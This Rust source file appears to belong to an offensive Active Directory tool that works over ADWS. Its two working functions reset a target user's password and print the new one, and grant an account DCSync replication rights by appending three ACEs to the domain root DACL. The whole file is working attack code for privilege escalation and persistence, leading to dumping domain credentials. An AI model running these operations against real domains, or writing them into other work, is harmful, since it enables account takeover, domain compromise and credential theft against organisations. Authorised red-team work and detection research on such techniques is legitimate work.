//! modify_user over ADWS: reset password (unicodePwd) or grant DCSync
//! (3 object-ACEs appended to the domain root DACL).

use anyhow::{anyhow, Result};
use adws_rs::{AdwsClient, Mod, Scope, SdFlags, Value};

use crate::actions::common::{base_dn, sd};
use crate::args::Options;
use crate::shlog;

use super::find_object;

/// DCSync extended-right GUIDs (DS-Replication-Get-Changes*).
const DCSYNC_GUIDS: &[&str] = &[
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "89e95b76-444d-4c62-991a-0facbeda640c",
];

fn pwd_utf16(p: &str) -> Vec<u8> {
    format!("\"{p}\"").encode_utf16().flat_map(|c| c.to_le_bytes()).collect()
}

/// Reset a user's password. ADWS is sealed (NNS), so the confidentiality
/// requirement for `unicodePwd` is met over SOAP as over LDAPS.
pub async fn change_password(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.target.as_deref().ok_or_else(|| anyhow!("--target required"))?;
    let base = base_dn(&opts.domain);
    let (dn, _) = find_object(client, &base, target).await?;

    let new_pass = opts.new_pass.clone().unwrap_or_else(|| {
        use rand::Rng;
        rand::thread_rng()
            .sample_iter(&rand::distributions::Alphanumeric)
            .take(24)
            .map(|c| c as char)
            .collect()
    });

    client
        .modify(&dn, &[Mod::replace("unicodePwd", vec![Value::Bytes(pwd_utf16(&new_pass))])], None)
        .await
        .map_err(|e| anyhow!("password change failed (need sufficient rights): {e}"))?;
    shlog!("password of '{target}' changed to: {new_pass}");
    Ok(())
}

/// Grant DCSync by appending 3 object-ACEs to the domain root DACL.
pub async fn elevate(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.target.as_deref().ok_or_else(|| anyhow!("--target required"))?;
    let forest_dn = base_dn(&opts.domain);

    let (_, target_sid) = find_object(client, &forest_dn, target).await?;

    // Read the domain root DACL (SD-flags: DACL only).
    let entries = client
        .search(&forest_dn, Scope::Base, "(objectClass=*)", &["nTSecurityDescriptor"], Some(SdFlags(SdFlags::DACL)), false)
        .await
        .map_err(|e| anyhow!("could not read domain root: {e}"))?;
    let e = entries.into_iter().next().ok_or_else(|| anyhow!("could not read domain root"))?;
    let raw_sd = e
        .bin_attrs
        .get("nTSecurityDescriptor")
        .and_then(|v| v.first().cloned())
        .ok_or_else(|| anyhow!("nTSecurityDescriptor not returned (need right to read it)"))?;

    let new_aces: Vec<Vec<u8>> = DCSYNC_GUIDS
        .iter()
        .map(|guid| sd::allow_object_ace(&target_sid, guid))
        .collect();
    let new_sd = sd::append_aces(&raw_sd, &new_aces)?;

    client
        .modify(&forest_dn, &[Mod::replace("nTSecurityDescriptor", vec![Value::Bytes(new_sd)])], Some(SdFlags(SdFlags::DACL)))
        .await
        .map_err(|e| anyhow!("elevate failed (need WriteDacl on domain root): {e}"))?;
    shlog!("granted {target} DCSync rights (3 object-ACEs appended)");
    Ok(())
}
